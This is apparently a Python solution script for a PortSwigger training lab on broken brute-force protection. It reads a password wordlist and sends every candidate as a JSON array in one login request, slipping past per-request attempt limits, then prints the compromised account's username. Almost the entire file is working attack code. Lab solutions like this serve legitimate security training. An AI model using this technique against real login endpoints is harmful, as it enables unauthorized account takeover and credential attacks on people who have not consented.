from requests import request
from json import JSONEncoder
from io import FileIO
from sys import argv

def get_session(url):
    print('GET /login')
    res=request(url=url,method='GET')
    cookies=""
    for key,value in res.cookies.get_dict().items():
        cookies=cookies+key+"="+value+";"
    return cookies

def readWorldList(wordlist_name):
    try:
        worldlist=FileIO(wordlist_name).read().decode().split('\n')
        while worldlist.count(''):
            worldlist.remove('')
        return worldlist
    except :
        print('[-] Error While reading file')

def pwn(url,username,password_list):
    if url[-1]!='/':
        url=url+'/'
    password_list=readWorldList(password_list)
    cookies=get_session(url+'login')
    data={"username":username,"password":password_list}
    data=JSONEncoder().encode(data)
    res=request(url=url+'login',method='POST',data=data,headers={'Cookie':cookies})
    content = res.content.decode()
    print("[+] Pwned Successfully")
    print(content[content.index('Your username'):-1].split('</p>')[0])

if __name__ == "__main__":
 print("""
    0xCrypt00o Soluation for Portswigger LAB : Broken-Brute-Force-Protection-Multiple-Credentials-Per-Request
        For More Soluation check :
                https://github.com/Crypt00o/Portswigger-Labs/
    """)
 if len(argv)==4:
     pwn(argv[1],argv[2],argv[3])
 else:
     print("call it with : ./pwn-auth-broken-brute-force-protection-multiple-credentials-per-request.py <url> <username> <path to password wordlist> ")
